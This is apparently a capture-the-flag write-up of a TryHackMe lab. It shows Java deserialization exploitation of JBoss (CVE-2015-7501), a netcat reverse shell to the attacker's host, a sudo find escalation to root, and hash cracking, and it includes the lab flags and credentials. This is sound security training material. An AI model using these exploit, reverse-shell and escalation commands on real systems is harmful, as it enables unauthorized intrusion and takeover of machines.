# TryHackMe — Tony the Tiger

**Room:** Tony the Tiger  
**URL:** tryhackme.com/room/tonythetiger  
**Difficulty:** Easy  
**Category:** Java Deserialization, Steganography, Privilege Escalation  
**CVE:** CVE-2015-7501  
**Date:** June 2026  
**Status:** Completed

---

## Overview

This room teaches Java deserialization attacks against a vulnerable JBoss application server. The attack chain involves exploiting CVE-2015-7501 to get RCE, reading files to find credentials, switching users, then abusing a sudo misconfiguration to escalate to root. There are also steganography and hash cracking elements for finding the flags.

---

## Flags

| Flag | Location | Method |
|---|---|---|
| Tony's Flag | Image embedded in Frosted Flakes blog post | Steganography — strings on JPEG |
| JBoss Flag | /home/jboss/.jboss.txt | Found after getting shell |
| Root Flag | /root/root.txt (base64 encoded MD5) | Hash cracking with hashcat |

**Tony's flag:** `THM{Tony_Sure_Loves_Frosted_Flakes}`  
**JBoss flag:** `THM{50c10ad46b5793704601ecdad865eb06}`  
**Root flag:** `zxcvbnm123456789` (cracked from MD5 hash `BC77AC072EE30E3760806864E234C7CF`)

---

## Reconnaissance

```bash
nmap -sV --version-light -T4 10.10.x.x
```

**Key ports:**

| Port | Service | Notes |
|---|---|---|
| 22 | SSH | OpenSSH 6.6.1p1 |
| 80 | HTTP | Apache 2.4.7 — Tony's Blog (Hugo) |
| 1090-1099 | Java RMI | Java serialization services |
| 8080 | HTTP | Apache Tomcat / JBoss AS |
| 8083 | HTTP | JBoss service |
| 8009 | AJP | Apache Jserv |

The hostname `thm-java-deserial` and multiple Java RMI ports immediately signal Java deserialization as the attack vector. Add to /etc/hosts:

```bash
echo "10.10.x.x thm-java-deserial.home" | sudo tee -a /etc/hosts
```

---

## Flag 1 — Steganography (Tony's Blog)

Before touching the exploit, browse Tony's blog at port 80. In the first post "My First Post" Tony writes:

> "So any photos I post must have a deeper meaning to them."

This is a direct hint at steganography. Download the image from the Frosted Flakes post and run strings against it:

```bash
wget https://i.imgur.com/be2sOV9.jpg
strings be2sOV9.jpg | grep THM
```

**Output:** `THM{Tony_Sure_Loves_Frosted_Flakes}`

**Lesson:** Always check images for embedded data. `strings` is the quickest first check before moving to heavier tools like steghide or binwalk.

---

## Exploitation — CVE-2015-7501 Java Deserialization RCE

### What is Java Deserialization?

Java serialization converts objects into byte streams for storage or transmission. Deserialization reverses this — converting byte streams back into objects. The vulnerability exists when an application deserializes untrusted data without validation. An attacker can craft a malicious serialized object that executes arbitrary OS commands when the server deserializes it.

JBoss exposes the `/invoker/JMXInvokerServlet` endpoint which accepts serialized Java objects. This endpoint does not validate the content of what it deserializes — giving us unauthenticated RCE.

### Tools Required

The room provides:
- `exploit.py` — sends the malicious payload to JBoss (CVE-2015-7501 PoC by byt3bl33d3r)
- `ysoserial.jar` — generates the malicious serialized Java payload

### Java Version Issue

Modern Java (17+) blocks the reflection access that ysoserial requires. The exploit fails with newer Java versions. Fix by using Java 11 specifically:

```bash
# Check available Java versions
ls /usr/lib/jvm/

# Test ysoserial with Java 11
/usr/lib/jvm/java-11-openjdk-amd64/bin/java -jar ysoserial.jar CommonsCollections5 "id"
```

If you see binary output (gibberish) that's the serialized payload — it's working.

Edit `exploit.py` line 63 to use Java 11 explicitly:

```python
# Change this:
gadget = check_output(['java', '-jar', ysoserial_path, 'CommonsCollections5', args.command])

# To this:
gadget = check_output(['/usr/lib/jvm/java-11-openjdk-amd64/bin/java', '-jar', ysoserial_path, 'CommonsCollections5', args.command])
```

### Verify RCE Before Reverse Shell

Always confirm RCE works before attempting a reverse shell. Use ping and tcpdump:

```bash
# Terminal 1 — listen for ICMP
sudo tcpdump -i tun0 icmp

# Terminal 2 — send ping command via exploit
python2 exploit.py TARGET_IP:8080 "ping -c 3 YOUR_TUN0_IP"
```

If you see ICMP echo requests in tcpdump, RCE is confirmed.

### Getting a Reverse Shell

**Important:** Kali's default netcat (`netcat-openbsd`) does not support the `-e` flag. Use `netcat-traditional` which supports `-c`:

```bash
sudo apt install netcat-traditional -y
```

Start listener:
```bash
nc -nlvp 4444
```

Send exploit:
```bash
python2 exploit.py TARGET_IP:8080 "nc YOUR_TUN0_IP 4444 -c /bin/bash"
```

### Upgrading the Shell

The initial shell is a basic dumb terminal. Upgrade it for full interactivity:

```bash
# Step 1 — spawn PTY
python -c 'import pty; pty.spawn("/bin/bash")'

# Step 2 — set terminal type
export TERM=xterm

# Step 3 — background the shell
Ctrl+Z

# Step 4 — fix terminal settings and foreground
stty raw -echo; fg

# Press Enter twice
```

You now have tab completion, arrow keys, and Ctrl+C works without killing the shell.

---

## Post-Exploitation Enumeration

```bash
whoami
# cmnatic

ls /home/
# cmnatic  jboss  tony

cat /home/cmnatic/to-do.txt
# Hints: Java is insecure, added note for JBoss

cat /home/jboss/note
# Reveals JBoss password: likeaboss

ls /home/jboss/
# note — the .jboss.txt is hidden

ls -la /home/jboss/
# .jboss.txt visible with -la
```

**Flag 2 found:**
```bash
cat /home/jboss/.jboss.txt
# THM{50c10ad46b5793704601ecdad865eb06}
```

**Credentials found:**
```
Username: jboss
Password: likeaboss
```

---

## Privilege Escalation

### Step 1 — Switch to jboss

```bash
su jboss
# Password: likeaboss
```

### Step 2 — Check sudo permissions

```bash
sudo -l
# User jboss may run the following commands:
#     (ALL) NOPASSWD: /usr/bin/find
```

jboss can run `find` as root with no password. This is a GTFOBins classic.

### Step 3 — Exploit find for root shell

```bash
sudo find . -exec /bin/bash \; -quit
whoami
# root
```

**How this works:** `find`'s `-exec` flag runs a command for each result. Since find runs as root via sudo, the spawned bash shell inherits root privileges. The `-quit` flag stops find after the first execution so you don't get multiple shells.

---

## Root Flag

```bash
cat /root/root.txt
# QkM3N0FDMDcyRUUzMEUzNzYwODA2ODY0RTIzNEM3Q0Y==

cat /root/root.txt | base64 -d
# BC77AC072EE30E3760806864E234C7CF
```

The output is base64 encoded. Decoding it gives an MD5 hash. Crack it with hashcat:

```bash
# Extract rockyou wordlist if not already done
sudo gunzip /usr/share/wordlists/rockyou.txt.gz

# Crack the hash
hashcat -a 0 -m 0 BC77AC072EE30E3760806864E234C7CF /usr/share/wordlists/rockyou.txt --force
```

**Result:** `BC77AC072EE30E3760806864E234C7CF:zxcvbnm123456789`

**Root flag:** `zxcvbnm123456789`

---

## Complete Attack Chain

```
Recon → nmap identifies JBoss on port 8080
↓
Blog enumeration → hint about images having deeper meaning
↓
Steganography → strings on Frosted Flakes image → Tony's flag
↓
CVE-2015-7501 → Java deserialization RCE via /invoker/JMXInvokerServlet
↓
Java 11 required → ysoserial fails on newer Java versions
↓
RCE confirmed via ping test
↓
Reverse shell → nc -c /bin/bash (netcat-traditional required)
↓
Shell upgraded → python pty + stty raw -echo
↓
Enumeration → found .jboss.txt flag + note with password
↓
su jboss → likeaboss
↓
sudo -l → find with NOPASSWD
↓
GTFOBins find exploit → root shell
↓
/root/root.txt → base64 decode → MD5 hash → hashcat → root flag
```

---

## Key Lessons

**Java Deserialization:**
- Old JBoss (and other Java app servers) deserialize untrusted data without validation
- ysoserial generates payloads using known vulnerable gadget chains
- Java version matters — newer Java blocks the reflection access ysoserial needs
- Always test with Java 11 if the payload fails

**Steganography:**
- `strings` is the fastest first check on any image
- Images embedded in blog posts or profiles are always worth examining in CTFs
- Tony's first post explicitly hinted at this

**Netcat Shells:**
- `netcat-openbsd` (default on many systems) strips the `-e` and `-c` flags
- `netcat-traditional` supports `-c /bin/bash` for reverse shells
- Always upgrade dumb shells immediately with python pty

**Sudo Misconfigurations:**
- `sudo -l` is always the first command after getting a shell
- GTFOBins documents exploits for any binary that can run as sudo
- `find` with `-exec` spawns commands with the same privileges as find itself

**Hash Cracking:**
- Always decode base64 before assuming something is a hash
- MD5 cracking with rockyou.txt is fast — seconds for common passwords
- The room hint "We will, we will Rock You" was pointing directly at rockyou.txt

---

## Tools Used

| Tool | Purpose |
|---|---|
| nmap | Port scanning and service detection |
| strings | Steganography — extracting text from images |
| python2 exploit.py | CVE-2015-7501 JBoss deserialization exploit |
| ysoserial.jar | Java deserialization payload generator |
| netcat-traditional | Reverse shell listener (`-c` flag support) |
| python pty | Shell upgrade |
| hashcat | MD5 hash cracking |
| rockyou.txt | Password wordlist |

---

## References

- CVE-2015-7501: https://www.rapid7.com/db/vulnerabilities/http-jboss-cve-2015-7501/
- ysoserial: https://github.com/frohoff/ysoserial
- Original exploit: https://github.com/byt3bl33d3r/java-deserialization-exploits
- GTFOBins find: https://gtfobins.github.io/gtfobins/find/
